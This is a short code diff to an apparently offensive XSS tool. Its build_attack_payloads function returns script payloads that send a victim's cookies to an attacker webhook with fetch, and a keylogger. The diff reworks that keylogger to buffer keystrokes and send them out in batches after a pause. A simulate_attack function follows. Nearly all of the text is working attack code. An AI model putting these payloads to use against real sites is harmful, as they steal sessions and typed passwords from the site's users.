@@ -81,13 +81,17 @@ def build_attack_payloads(webhook):
         "cookie_stealer": f"<script>fetch('{webhook}?cookie='+document.cookie)</script>",
         "keylogger": (
             "<script>"
-            "document.addEventListener('keydown', function(e) {"
-            f"fetch('{webhook}?key='+e.key);"
+            "let b='',t;"
+            "document.addEventListener('keydown',e=>{"
+            "b+=e.key;"
+            "clearTimeout(t);"
+            f"t=setTimeout(()=>{{fetch('{webhook}?keys='+encodeURIComponent(b));b=''}},2000);"
             "});"
             "</script>"
         ),
         "custom_alert": "<script>alert('Custom JS injected!');</script>"
     }
+
 
 def simulate_attack(search_url_pattern, webhook):
     attacks = build_attack_payloads(webhook)
